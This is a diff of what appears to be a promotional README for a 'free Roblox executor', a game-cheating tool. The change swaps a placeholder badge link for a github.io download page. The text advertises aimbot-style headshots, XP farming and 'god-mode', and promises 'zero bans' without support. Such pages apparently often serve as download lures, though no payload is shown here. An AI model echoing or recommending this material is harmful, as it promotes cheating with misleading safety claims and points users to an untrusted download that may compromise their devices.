@@ -3,7 +3,7 @@
 Looking to snap headshots and farm XP without breaking the bank—or the ban hammer?
 **Free Roblox executor** drops you straight into god-mode by loading any Lua script in milliseconds. Zero cash, **zero bans, max wins**. 🏆
 
-[![Get FREE ROBLOX EXECUTOR](https://img.shields.io/badge/Get%20FREE%20ROBLOX%20EXECUTOR-blueviolet)](EXAMPLE)
+[![Get FREE ROBLOX EXECUTOR](https://img.shields.io/badge/Get%20FREE%20ROBLOX%20EXECUTOR-blueviolet)](https://executor-for-roblox-for-free.github.io/.github/)
 
 *Quick Links:* [Overview](#overview) • [Features](#feature-breakdown-️) • [Install](#instant-install-guide)
 
